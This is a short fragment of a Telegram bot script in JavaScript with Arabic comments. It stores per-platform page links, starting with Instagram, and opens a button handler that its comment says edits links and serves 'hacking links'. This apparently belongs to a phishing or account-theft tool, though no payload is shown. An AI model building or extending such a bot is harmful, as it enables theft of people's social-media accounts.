...
// --- نظام إدارة روابط الصفحات الجديد (بالتعديلات الكاملة) ---

// تخزين الروابط في الذاكرة (لكل منصة رابطين)
let pageLinks = {
    instagram: {
...
// معالج الضغط على الأزرار (تعديل الروابط + روابط الاختراق)
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
